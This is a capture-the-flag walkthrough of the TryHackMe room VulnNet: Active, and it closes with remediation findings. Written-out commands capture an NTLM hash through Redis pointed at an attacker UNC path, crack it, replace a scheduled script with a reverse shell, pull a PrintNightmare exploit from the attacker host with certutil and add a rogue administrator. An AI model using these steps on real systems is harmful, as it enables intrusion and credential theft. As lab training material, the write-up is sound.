# VulnNet: Active — TryHackMe Walkthrough

**Platform:** TryHackMe  
**Room:** VulnNet: Active  
**Difficulty:** Medium  
**OS:** Windows
**Attack Chain:** Unauthenticated Redis → NTLM Hash Capture → Password Cracking → SMB Access → Scheduled Task Abuse → PrintNightmare → SYSTEM Access  


<img width="716" height="299" alt="image" src="https://github.com/user-attachments/assets/3ee72362-b58f-4466-97c0-97c20662213f" />


---

## 1. Reconnaissance

The engagement began with a full TCP port scan to identify all exposed services on the target machine. A quick and silent scan revealed multiple open ports, including several characteristic of a Windows Active Directory environment.

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
6379/tcp  open  redis         syn-ack ttl 126 Redis key-value store 2.8.2402
49666/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49695/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49778/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (96%)
OS CPE: cpe:/o:microsoft:windows_server_2019
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Windows Server 2019 (96%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=9/26%OT=53%CT=%CU=%PV=Y%DS=3%DC=T%G=N%TM=6AB80479%P=x86_64-pc-linux-gnu)
SEQ(TI=I%TS=U)
SEQ(SP=FF%GCD=1%ISR=101%TI=I%II=I%SS=S%TS=U)
OPS(O1=M4E8NW8NNS%O2=M4E8NW8NNS%O3=M4E8NW8%O4=M4E8NW8NNS%O5=M4E8NW8NNS%O6=M4E8NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M4E8NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 3 hops
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-26T17:43:49
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 60675/tcp): CLEAN (Timeout)
|   Check 2 (port 36801/tcp): CLEAN (Timeout)
|   Check 3 (port 7510/udp): CLEAN (Timeout)
|   Check 4 (port 2568/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 0s

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   73.18 ms 192.168.128.1
2   ...
3   74.12 ms 10.129.131.25

```

**Open Ports Identified:**

| Port | Service |
|------|---------|
| 53 | DNS (Simple DNS Plus) |
| 135 | Microsoft RPC |
| 139 | NetBIOS-SSN |
| 445 | SMB |
| 464 | kpasswd5 (Kerberos password change) |
| 6379 | Redis |
| 9389 | ADWS (.NET Message Framing) |

A more detailed service scan confirmed the presence of a Redis key-value store (version 2.8.2402) on port 6379 — an unusual service to find exposed on a Domain Controller.

**Fingerprinting the Domain Controller:**

The combination of DNS on port 53, Kerberos password change on port 464, and SMB on ports 139/445 strongly indicated that the target was a Domain Controller.

Using NetExec against the SMB service revealed the machine name, domain, and SMB signing status:

```bash
┌─[donmed@parrot]─[~/LAB/tryhackme/vulnet]─[192.168.142.157]
└──╼ $ nxc smb 10.129.131.25
SMB         10.129.131.25   445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:None) (Null Auth:True)
```

**Result:**
- Machine name: `VULNNET-BC3TCK1`
- Domain: `vulnnet.local`
- SMB signing: True

The `/etc/hosts` file was updated accordingly:

```
┌─[donmed@parrot]─[~/LAB/tryhackme/vulnet]─[192.168.142.157]
└──╼ $ sudo nxc smb 10.129.131.25 --generate-hosts-file /etc/hosts
SMB         10.129.131.25   445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:None) (Null Auth:True)
```

---

## 2. Enumeration

### 2.1 SMB Enumeration

Initial SMB enumeration with a guest account was unsuccessful — the guest account was disabled. However, anonymous login was successful, though no workgroup was available.

### 2.2 Redis Enumeration

The Redis instance on port 6379 was accessible without authentication — a critical misconfiguration. Connecting with `redis-cli`:

```
┌─[donmed@parrot]─[~/LAB/tryhackme/vulnet]─[192.168.142.157]
└──╼ $ redis-cli -h 10.129.131.25 
10.129.131.25:6379>

```

The `info` command confirmed the Redis version (2.8.2402) and that the service was running in standalone mode on Windows.

Enumerating the configuration with `CONFIG GET *` revealed the working directory:

```
┌─[donmed@parrot]─[~/LAB/tryhackme/vulnet]─[192.168.142.157]
└──╼ $ redis-cli -h 10.129.131.25 
10.129.131.25:6379> CONFIG GET dir
1) "dir"
2) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
10.129.131.25:6379>

```

This exposed a valid Windows username: **`enterprise-security`**.

---

## 3. Exploitation

### 3.1 NTLM Hash Capture via Redis

With the Redis instance unauthenticated, the next step was to force the service to authenticate to an attacker-controlled machine, capturing the NTLMv2 hash of the user running the Redis service.

**Step 1 — Start Responder** on the attacking machine:

```bash
sudo responder -I tun0 -dwv
```

**Step 2 — Trigger a connection from Redis** using the `CONFIG SET dir` command, pointing to a fake UNC path:

```

1 . Redis CLI

10.129.131.25:6379> CONFIG SET dir \\192.168.142.157\fake-share
(error) ERR Changing directory: Permission denied
10.129.131.25:6379>

2. Responder

[SMB] NTLMv2-SSP Client   : 10.129.131.25
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:17eb15aa6d65df5c:B5DF937ADABC56BF2CB9E5E6C977E407:0101000000000000801CD66CDF4DDD0181DA36A216A7443D0000000002000800510056005200360001001E00570049004E002D0051003700560032003700590042003600580037004B0004003400570049004E002D0051003700560032003700590042003600580037004B002E0051005600520036002E004C004F00430041004C000300140051005600520036002E004C004F00430041004C000500140051005600520036002E004C004F00430041004C0007000800801CD66CDF4DDD010600040002000000080030003000000000000000000000000030000076DE3A94257AEAD0F97FDB9571452AE38E677DE30669C8E1D20AB50FCF90C57B0A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100340032002E0031003500370000000000000000



```

Responder captured the NTLMv2 hash for the **`enterprise-security`** user.

### 3.2 Password Cracking

The captured NTLMv2 hash was cracked using Hashcat with the `rockyou.txt` wordlist:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Recovered Credentials:**
```
enterprise-security : sand_0873959498
```

A weak password policy enabled rapid recovery of the plaintext password.

### 3.3 SMB Access and Scheduled Task Abuse

Using the recovered credentials, SMB shares were enumerated:

```bash
┌─[donmed@parrot]─[~/LAB/tryhackme/vulnet]─[192.168.142.157]
└──╼ $ sudo nxc smb 10.129.131.25 -u ENTERPRISE-SECURITY -p sand_0873959498 --shares
SMB         10.129.131.25   445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.131.25   445    VULNNET-BC3TCK1  [+] vulnnet.local\ENTERPRISE-SECURITY:sand_0873959498 
SMB         10.129.131.25   445    VULNNET-BC3TCK1  [*] Enumerated shares
SMB         10.129.131.25   445    VULNNET-BC3TCK1  Share           Permissions     Remark
SMB         10.129.131.25   445    VULNNET-BC3TCK1  -----           -----------     ------
SMB         10.129.131.25   445    VULNNET-BC3TCK1  ADMIN$                          Remote Admin
SMB         10.129.131.25   445    VULNNET-BC3TCK1  C$                              Default share
SMB         10.129.131.25   445    VULNNET-BC3TCK1  Enterprise-Share READ,WRITE      
SMB         10.129.131.25   445    VULNNET-BC3TCK1  IPC$            READ            Remote IPC
SMB         10.129.131.25   445    VULNNET-BC3TCK1  NETLOGON        READ            Logon server share 
SMB         10.129.131.25   445    VULNNET-BC3TCK1  SYSVOL          READ            Logon server share 

```

An interesting share named **`Enterprise-Share`** was discovered. Inside, a PowerShell script named **`PurgeIrrelevantData_1826.ps1`** was found:

```
┌─[donmed@parrot]─[~/LAB/tryhackme/vulnet]─[192.168.142.157]
└──╼ $ smbclient //10.129.131.25/Enterprise-Share -U ENTERPRISE-SECURITY
Password for [WORKGROUP\ENTERPRISE-SECURITY]:
Try "help" to get a list of possible commands.
smb: \> ir
ir: command not found
smb: \> dir
  .                                   D        0  Sat Sep 26 17:54:54 2026
  ..                                  D        0  Sat Sep 26 17:54:54 2026
  PurgeIrrelevantData_1826.ps1        A     1359  Sat Sep 26 17:01:04 2026

		9558271 blocks of size 4096. 5040614 blocks available
smb: \>

```

Since the `enterprise-security` user had write access to this share, the script was replaced with a malicious reverse shell payload using a Nishang PowerShell TCP reverse shell.

**Step 1 — Create the malicious script:**

<img width="1121" height="757" alt="image" src="https://github.com/user-attachments/assets/ee4a59ac-ed82-4826-b859-4ffa039fa337" />


**Step 2 — Upload the modified script:**

```
smbclient //10.129.131.25/Enterprise-Share -U VULNNET.local/enterprise-security
> put PurgeIrrelevantData_1826.ps1
```

**Step 3 — Set up a listener:**

```
nc -lvnp 4444
```

After a few seconds, the scheduled task executed the script, and a reverse shell was received.

**User Flag:** `THM{3eb176aee96432d5b100bc93580b291e}`

---

## 4. Privilege Escalation — PrintNightmare

### 4.1 Vulnerability Assessment

With a shell as `enterprise-security`, the Print Spooler service was checked:

```
Get-Service Spooler
# Status: Running
```

The system was missing critical patches for CVE-2021-34527 (PrintNightmare):

```
Get-HotFix | Where-Object { $_.HotFixID -match "KB5004945|KB5005033" }
# Result: Empty
```

This confirmed the system was vulnerable to the PrintNightmare privilege escalation vulnerability.

### 4.2 Exploitation

A PrintNightmare exploit (CVE-2021-1675) was uploaded to the target using `certutil`:

```
certutil -urlcache -split -f http://192.168.142.157/CVE-2021-1675.ps1 C:\Users\enterprise-security\Desktop\nightmare.ps1
```

The exploit was imported and executed to create a new local administrator:

```
Import-Module C:\Users\enterprise-security\Desktop\nightmare.ps1
Invoke-Nightmare -NewUser "overmane" -NewPassword "Passwd123"
```

This created a new administrative user, **`overmane`**, with the password `Passwd123`.

### 4.3 SYSTEM Access

Using Impacket's `psexec` with the newly created administrative credentials, a SYSTEM-level shell was obtained:

```
impacket-psexec VULNNET.local/overmane:Passwd123@192.168.142.157
```

**System Flag:** `THM{d540c0645975900e5bb9167aa431fc9b}`

---

## 5. Security Findings & Recommendations

### Key Findings

| Finding | Impact |
|---------|--------|
| Unauthenticated Redis instance exposed on the network | Allowed NTLM hash capture and file read |
| Weak password policy | Enabled rapid offline cracking of NTLMv2 hash |
| Write access to scheduled PowerShell script | Allowed arbitrary code execution as service account |
| Missing PrintNightmare patches | Enabled local privilege escalation to SYSTEM |
| Print Spooler service running unnecessarily | Attack surface for CVE-2021-34527 |

management — particularly for well-known vulnerabilities like PrintNightmare. This walkthrough reinforces that a single weak point in an enterprise environment can lead to complete system compromise when chained with other vulnerabilities.
